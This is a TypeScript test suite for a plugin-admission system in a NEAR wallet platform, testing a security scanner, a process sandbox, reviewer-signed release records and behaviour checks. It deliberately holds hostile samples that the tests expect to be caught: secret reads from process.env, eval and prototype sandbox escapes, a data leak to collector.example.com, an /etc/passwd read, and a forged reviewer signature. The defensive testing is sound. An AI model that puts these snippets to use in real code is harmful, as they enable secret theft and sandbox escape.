/** Part admission (SRS-1 §11): tiers, the security scan, the sandbox, release records and the automated checks. */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { base64 } from '../core/src/seal.js';
import { demoWalletSign } from '../core/src/creator.js';
import { sha256Hex } from '../core/src/canonical.js';
import { checklistFor, partTier, reviewedManifestHash, reviewMessage, securityScan, verifyRecord, type ReleaseRecord, type ReviewerSet } from '../core/src/review.js';
import type { Catalog, PartManifest } from '../core/src/srs.js';
import { compilePart, runSandboxed, stageCompiled, type SandboxHost } from '../runner/src/sandbox.js';
import { admitParts } from '../runner/src/admission.js';
import { REAL_ENDPOINTS, guardedFetch } from '../runner/src/executor.js';
import { runChecks } from '../server/src/review.js';

const root = join(import.meta.dirname, '..');
const json = (p: string) => JSON.parse(readFileSync(join(root, p), 'utf8'));
const catalog = json('standard/parts.json') as Catalog;
const reviewers = json('standard/reviewers.json') as ReviewerSet;
const part = (id: string) => catalog.parts.find((p) => p.id === id)!;
const src = (m: PartManifest) => readFileSync(join(root, m.implementation!), 'utf8');

test('admission: every catalog part passes the security scan, and tiers follow what the manifest allows', () => {
  const tiers = { open: 0, reviewed: 0, signing: 0 };
  for (const m of catalog.parts) {
    assert.deepEqual(securityScan(src(m), m).diagnostics.filter((d) => d.severity === 'error'), [], m.id);
    tiers[partTier(m).tier]++;
  }
  assert.deepEqual(tiers, { open: 17, reviewed: 3, signing: 6 });
  assert.equal(partTier(part('keys.revoke@1.0.0')).tier, 'signing', 'asks the buyer to sign');
  assert.equal(partTier(part('ai.spam-shield@1.1.0')).tier, 'reviewed', 'calls a model');
  assert.equal(partTier(part('filter.dust@1.0.0')).tier, 'open', 'pure');
  assert.equal(partTier({ ...part('near.wallet-scanner@1.0.0'), capabilities: ['net:collector.example.com'] }).tier, 'reviewed', 'a new host needs a reviewer');
  assert.equal(checklistFor(part('filter.dust@1.0.0')).length, 0, 'nobody signs off on open parts');
  assert.ok(checklistFor(part('keys.revoke@1.0.0')).some((c) => c.id === 'tx'), 'signing parts: transactions are checked');
});

test('admission: the security scan catches the usual escapes', () => {
  const m = part('filter.dust@1.0.0');
  const body = (code: string, imports = "import type { PartHandler } from '../types.js';") => `${imports}\nexport const p: PartHandler = async (inputs, ctx) => { ${code}; ctx.log('x'); return { dust: [] }; };`;
  const codes = (s: string) => securityScan(s, m).diagnostics.filter((d) => d.severity === 'error').map((d) => d.code);
  const cases: [string, string][] = [
    [body("const m = await import('node:net')"), 'dynamic-import'],
    [body('const k = process.env.NEAR_AI_API_KEY'), 'process'],
    [body('globalThis.fetch'), 'globals'],
    [body("eval('1')"), 'codegen'],
    [body("new Function('return this')()"), 'codegen'],
    [body("const f = ({}).constructor.constructor"), 'prototype'],
    [body("await ctx.http('https://collector.example.com/x')"), 'host'],
    [body("String.fromCharCode(104, 116, 116, 112)"), 'obfuscation'],
    [body("const h = '\\x68\\x74\\x74\\x70\\x73'"), 'obfuscation'],
    [body('', "import { connect } from 'node:net';"), 'import'],
    [body("const tx = { receiverId: 'evil.near', actions: [] }"), 'tx'],
    [body('const w = new WebSocket("wss://x.example.com")'), 'network'],
  ];
  for (const [s, code] of cases) assert.ok(codes(s).includes(code), `${code} not caught in: ${s.split('\n')[1].slice(0, 90)}`);
});

const quietHost = (over: Partial<SandboxHost> = {}): SandboxHost => ({
  http: async () => new Response('{}'), requestApproval: async () => ({ approved: false, txHashes: [] }), saveState: async () => {}, log: () => {}, wait: async () => {}, ...over,
});
const sandbox = async (source: string, m: PartManifest, inputs: Record<string, unknown>, host = quietHost(), maxMs = 3000) =>
  runSandboxed({ file: stageCompiled(await compilePart(source)), exportName: 'p', inputs, maxMs, ctx: { nodeId: 'n', manifest: m, params: {}, mode: 'run', endpoints: REAL_ENDPOINTS } }, host);

test('admission: the sandbox runs an honest part, and confines a hostile one', async () => {
  const m = part('filter.dust@1.0.0');
  // an honest open part: the real dust filter, run in its own process
  const dust = src(m).replace('export const dustFilter', 'export const p');
  const out = await sandbox(dust, m, { holdings: [{ symbol: 'REF', usd: 3 }, { symbol: 'NEAR', usd: 400 }], threshold_usd: 25 });
  assert.deepEqual((out.dust as { symbol: string }[]).map((h) => h.symbol), ['REF']);
  // no network functions, no process environment, no code from strings
  const probe = `export const p = async () => ({ fetch: typeof fetch, ws: typeof WebSocket, env: Object.keys((globalThis as any)['pro' + 'cess'].env).length, gen: (() => { try { return (0, eval)('1'); } catch { return 'blocked'; } })() });`;
  assert.deepEqual(await sandbox(probe, m, {}), { fetch: 'undefined', ws: 'undefined', env: 0, gen: 'blocked' });
  // the only way out is ctx.http, and the runner's guard refuses undeclared hosts
  const leak = `export const p = async (inputs: any, ctx: any) => { await ctx.http('https://collector.example.com/' + inputs.wallet); return {}; };`;
  await assert.rejects(sandbox(leak, m, { wallet: 'bob.testnet' }, quietHost({ http: guardedFetch(m.id, m.capabilities, new Map()) })), /capability violation/);
  // modules outside the allowed helpers do not even compile
  await assert.rejects(compilePart(`import { readFileSync } from 'node:fs'; export const p = async () => ({ x: readFileSync('/etc/passwd', 'utf8') });`), /node:fs is not available|not allowed/);
  // a busy loop is killed at max_ms (the in-process limits could not stop it)
  const t0 = Date.now();
  await assert.rejects(sandbox('export const p = async () => { for (;;) {} };', m, {}, quietHost(), 300), /exceeded max_ms/);
  assert.ok(Date.now() - t0 < 3000);
});

test('admission: release records admit a part only as reviewed, by appointed reviewers who are not the author', () => {
  const m = part('keys.revoke@1.0.0');
  const sha = sha256Hex(src(m).replace(/\r\n/g, '\n'));
  const log = json('standard/reviews.json');
  assert.equal(verifyRecord(log.records.find((r: ReleaseRecord) => r.part === m.id), m, sha, reviewers), null, 'genesis record verifies');
  assert.match(verifyRecord(log.records.find((r: ReleaseRecord) => r.part === m.id), m, sha256Hex('tampered'), reviewers)!, /code differs/);
  const items = checklistFor(m).map((c) => c.id);
  const approve = (reviewer: string, checklist = items) => ({ reviewer, checklist, at: '2026-11-08', signature: base64.enc(demoWalletSign(reviewer, reviewMessage('sub1', m.id, reviewedManifestHash(m), sha, reviewer, 'approve', checklist))) });
  const rec = (approvals: ReturnType<typeof approve>[], author = m.author): ReleaseRecord => ({ part: m.id, tier: 'signing', author, implementation: m.implementation!, manifest_hash: reviewedManifestHash(m), source_sha256: sha, basis: 'review', submission: 'sub1', checks_hash: 'x', approvals, released_at: '2026-11-08' });
  assert.equal(verifyRecord(rec([approve('audit-a.testnet'), approve('audit-b.testnet')]), m, sha, reviewers), null, 'two independent approvals');
  assert.match(verifyRecord(rec([approve('audit-a.testnet')]), m, sha, reviewers)!, /needs 2/);
  assert.match(verifyRecord(rec([approve('audit-a.testnet'), approve('audit-a.testnet')]), m, sha, reviewers)!, /needs 2/, 'the same reviewer twice counts once');
  assert.match(verifyRecord(rec([approve('audit-a.testnet'), approve('mallory.testnet')]), m, sha, reviewers)!, /not an appointed reviewer/);
  assert.match(verifyRecord(rec([approve('audit-a.testnet'), approve('audit-b.testnet')], 'audit-b.testnet'), m, sha, reviewers)!, /author cannot review/);
  assert.match(verifyRecord(rec([approve('audit-a.testnet', items.slice(1)), approve('audit-b.testnet')]), m, sha, reviewers)!, /every checklist item/);
  const forged = { ...approve('audit-b.testnet'), signature: approve('audit-a.testnet').signature };
  assert.match(verifyRecord(rec([approve('audit-a.testnet'), forged]), m, sha, reviewers)!, /signature does not verify/);
  assert.match(verifyRecord({ ...rec([]), basis: 'automated' }, m, sha, reviewers)!, /recorded as signing|only open parts/);
});

test('admission: the runner admits every part of this release, and the automated checks gate open parts', async () => {
  const a = await admitParts(root, catalog);
  assert.equal(a.admitted.size, catalog.parts.length);
  assert.deepEqual([...a.refused], []);
  // an open part passes the checks on its own: no reviewer needed
  const dust = part('filter.dust@1.0.0');
  const okNew = { ...dust, id: 'acme.dust-copy@1.0.0', author: 'acme.testnet', implementation: undefined };
  const ok = await runChecks(okNew, src(dust), catalog, new Map());
  assert.ok(ok.passed, JSON.stringify(ok.behaviour.map((b) => b.error ?? b.violations)));
  // a signing part that asks for a signature during a quote fails the behaviour test
  const rev = part('keys.revoke@1.0.0');
  const sneaky = src(rev).replace("if (ctx.mode === 'quote' || revoke.length === 0) {", "if (ctx.mode === 'quote') await ctx.requestApproval({ title: 'x', signer: account, transactions: [], summary: [] });\n  if (ctx.mode === 'quote' || revoke.length === 0) {");
  assert.notEqual(sneaky, src(rev));
  const bad = await runChecks({ ...rev, id: 'acme.revoke@1.0.0', author: 'acme.testnet', implementation: undefined }, sneaky, catalog, new Map());
  assert.equal(bad.passed, false);
  assert.ok(bad.behaviour.some((b) => b.violations.some((v) => /during a quote/.test(v))), JSON.stringify(bad.behaviour));
});
